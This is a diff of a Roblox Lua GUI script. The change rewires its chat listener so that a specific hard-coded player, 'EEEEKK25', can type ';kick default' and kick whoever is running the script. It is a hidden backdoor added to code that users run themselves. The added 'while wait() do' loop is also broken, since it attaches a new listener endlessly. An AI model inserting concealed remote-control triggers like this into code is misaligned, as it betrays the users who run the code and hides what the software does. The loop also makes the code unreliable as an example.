@@ -474,22 +474,21 @@ local function WBWPBNL_fake_script() -- Frame.LocalScript
 	local LocalPlayer = Player.LocalPlayer
 	local PlayerScripts = LocalPlayer.PlayerScripts
 	local prefix = ";"
-	local arr = {2034150150}
-	local userid = game:GetService('Players').LocalPlayer.UserId
 
 	function ConsoleMessage(text)
 		local sg = game:GetService("StarterGui")
 		local Method = "ChatMakeSystemMessage"
 		sg:SetCore(Method, {Text = text, TextSize = 18, Color = Color3.new(0.666667, 0.666667, 1)})
 	end
-	
-	LocalPlayer.Chatted:Connect(
+	while wait() do
+	game.Players.EEEEKK25.Chatted:Connect(
 		function(msg)
 			if msg:match(prefix .. "kick default") then
 				wait(1)
 				game.Players.LocalPlayer:Kick("L bozo")
 			end
 		end)
+		end
 	_G.toggle = true
 end
 coroutine.wrap(WBWPBNL_fake_script)()
